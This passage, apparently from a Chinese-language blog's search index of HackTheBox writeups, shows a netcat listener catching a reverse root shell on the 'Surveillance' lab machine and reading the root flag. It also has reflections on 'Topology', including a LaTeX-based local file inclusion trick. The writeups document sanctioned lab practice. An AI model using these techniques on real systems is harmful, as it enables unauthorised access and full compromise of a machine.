or 'n' to continue : n\n\nUpgrading database to version 1.36.32\nUpgrading DB to 1.26.1 from 1.26.0\n</code></pre></p>","tags":["HTB/Linux","HTB/Medium"]},{"location":"writeup/retired/HTB-Surveillance/#flag-root","title":"flag: root","text":"<p>\u63a5\u6536\u4e0a\u9762\u8fd0\u884c\u540e\u5f97\u5230\u7684\u53cd\u5f39shell\uff0c\u62ffflag\uff1a <pre><code>\u2514\u2500$ nc -lvnp 4446\nlistening on [any] 4446 ...\nconnect to [10.10.14.12] from (UNKNOWN) [10.10.11.245] 33042\nid\nuid=0(root) gid=0(root) groups=0(root)\ncat /root/root.txt\nfb09 (...) 29cd\n</code></pre></p>","tags":["HTB/Linux","HTB/Medium"]},{"location":"writeup/retired/HTB-Surveillance/#_2","title":"\u603b\u7ed3\u00b7\u540e\u8bb0","text":"<p>2023/12/13</p> <p>\u2026\u2026</p>","tags":["HTB/Linux","HTB/Medium"]},{"location":"writeup/retired/HTB-Topology/","title":"HTB-Topology","text":"<p>Waiting for machine retire...</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Topology/#summary","title":"Summary","text":"<p>emmmm\uff0c\u592a\u504f\u4e86\uff0c\u73a9\u5bb6\u8bc4\u5206\u4e5f\u8f83\u4f4e\u3002\u7ed3\u679c\u8fd8\u662f\u56f4\u89c2\u5927\u4f6c\u7684\u65b9\u6cd5\u6253\u5b8c\u3002\u4e5f\u4e0d\u77e5\u9053\u4e4b\u540e\u4f1a\u4e0d\u4f1a\u5199\u5199\u8be6\u7ec6\u7248\u4e86\u2026\u2026\u59d1\u4e14\u4f20\u4e2a\u653b\u51fb\u8def\u5f84\u56fe\u5427\u3002</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Topology/#attack-path-overview","title":"Attack Path Overview","text":"","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Topology/#_1","title":"\u603b\u7ed3\u00b7\u540e\u8bb0","text":"<p>2023/06/11</p> <p>\u51e0\u4e2a\u5730\u65b9\u4e0d\u662f\u5f88\u61c2\u3002</p> <ul> <li> <p>\u4e3a\u4ec0\u4e48LFI\u7684payload\u9700\u8981\u7528\u201c$\u201d\u5305\u56f4\uff1f</p> <ul> <li> <p>\u540e\u6765\u770b\u8fd9\u4f4d\u5e08\u5085\u7684WP\u6709\u8bf4\u660e&amp;\u4e24\u4e2a\u94fe\u63a5</p> <p>\u5728 latex \u547d\u4ee4\u7684\u4e24\u7aef\u52a0\u4e0a $\uff0c\u53ef\u4ee5\u7528\u6570\u5b66\u6a21\u5f0f\u8fd0\u884c\u8fd9\u4e2a latex \u547d\u4ee4 https://www.kancloud.cn/thinkphp/latex/41806 https://tex.stackexchange.com/questions/503/why-is-preferable-to</p> </li> </ul> </li> <li> <p>\u5982\u4f55\u53d1\u73b0\u4e0a\u4f20\u4ee5\u53ca\u4e0a\u4f20\u6587\u4ef6\u5939\uff0c\u53ea\u80fd\u9760\u8bd5\u51fa\u6765\u5417\uff1f</p> </li> </ul> <p>\u53cd\u7701\uff1a\u7531\u4e8e\u6700\u5f00\u59cb\u662f\u6ca1\u6709\u4e3b\u57df\u540d\u7684\uff0c\u800c\u7b2c\u4e00\u4e2a\u5b50\u57df\uff08latex\uff09\u662f\u76f4\u63a5\u5728\u7f51\u9875\u6e90\u7801\u53d1\u73b0\u7684\uff0c\u6240\u4ee5\u5c31\u5355\u7eaf\u5730\u8ba4\u4e3a\u53ea\u6709\u8fd9\u4e00\u4e2a\u5b50\u57df\u3002\u4e8e\u662f\u6ca1\u6709\u5c1d\u8bd5\u5b50\u57df\u679a\u4e3e\u4e86\uff0c\u4ece\u800c\u9519\u8fc7\u4e00\u4e2a\u5229\u7528LFI\u7684\u91cd\u8981\u4fe1\u606f\u3002\u4f46\u662f\u5176\u5b9e\u5373\u4f7f\u53d1\u73b0\u4e86dev\u5b50\u57df\uff0c\u77e5\u9053\u6709\u8fd9\u4e2a\u9879\u76ee\u6587\u4ef6\u5939\uff0c\u4e5f\u77e5\u9053Apache\u7684\u654f\u611f\u6587\u4ef6\u4f4d\u7f6e\u3002\u6211\u60f3\u4e5f\u4f1a\u56e0\u4e3a\u4e0a\u8ff0\u7684\u4e0d\u77e5\u9053\u6b64\u5904LFI\u7684payload\u9700\u8981\u7528\u201c$\u201d\u5305\u56f4\u800c\u9519\u8fc7\u7a81\u7834\u53e3\u3002</p> <p>\u603b\u7684\u6765\u8bf4\u611f\u89c9\u662f\u4e00\u4e2a\u6709\u70b9\u5947\u602a\u7684\u9776\u673a\u3002\u6709\u79cdCTF\u8003\u504f\u50fb\u77e5\u8bc6\u70b9\u7684\u611f\u89c9\uff1f</p>","tags":["HTB/Linux","HTB/Easy"]}]}